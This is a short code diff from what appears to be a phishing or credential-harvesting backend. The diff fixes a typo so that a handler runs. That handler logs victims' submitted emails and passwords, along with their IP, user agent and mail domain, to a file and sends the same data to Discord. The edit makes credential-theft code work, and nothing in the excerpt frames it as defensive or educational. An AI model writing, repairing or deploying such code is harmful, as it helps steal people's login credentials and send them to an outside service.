@@ -182,7 +182,7 @@ def first():
         mx_record = get_mx_record(domain) if domain else "Invalid Domain"
 
         # Log data to a text file
-        log_to file(email, password, ip, useragent, domain, mx_record)
+        log_to_file(email, password, ip, useragent, domain, mx_record)
 
         # Send data to Discord
         send_discord_message(email, password, ip, useragent, domain, mx_record)
